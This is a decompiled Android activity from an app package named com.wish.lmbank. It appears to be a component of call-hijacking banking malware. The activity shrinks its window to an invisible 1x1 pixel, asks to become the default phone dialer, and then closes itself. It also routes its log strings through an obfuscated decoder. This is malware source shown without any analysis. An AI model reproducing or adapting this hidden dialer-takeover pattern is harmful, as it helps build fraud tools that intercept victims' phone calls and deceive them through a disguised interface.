package com.wish.lmbank.activity;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/VRequestDefaultDialerActivity.class */
public class VRequestDefaultDialerActivity extends Activity {
    private final String TAG = VRequestDefaultDialerActivity.class.getName();
    private Handler handler = new Handler();
    private final int DELAY_MILLIS = 5000;

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        StringBuilder sb = new StringBuilder();
        sb.append(this.TAG);
//         sb.append(bb7d7pu7.m5998("RUkGByobDAgdDA"));
        sb.append(", onCreate");
        LogUtils.callLog(sb.toString());
        Window window = getWindow();
        window.setGravity(Gravity.START);
        WindowManager.LayoutParams attributes = window.getAttributes();
        attributes.x = 0;
        attributes.y = 0;
        attributes.height = 1;
        attributes.width = 1;
        window.setAttributes(attributes);
        if (SettingUtils.requestDefaultDialer(this, false, this.TAG)) {
            this.handler.postDelayed(new Runnable() { // from class: com.wish.lmbank.activity.VRequestDefaultDialerActivity.1

                @Override // java.lang.Runnable
                public void run() {
                    finish();
                }
            }, 5000L);
        } else {
            finish();
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
//         LogUtils.callLog(bb7d7pu7.m5998("PzsMGBwMGh0tDA8IHAUdLQAIBQwbKAodAB8AHRBFSQYHKAodAB8AHRA7DBocBR1FSRsMGBwMGh0qBg0MU0k") + i + bb7d7pu7.m5998("RUkbDBocBR0qBg0MU0k") + i2);
        LogUtils.callLog("VRequestDefaultDialerActivity, onActivityResult, requestCode: " + i + ", resultCode: " + i2);
        if (i == 1002) {
            finish();
        }
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        this.handler.removeCallbacksAndMessages(null);
    }
}
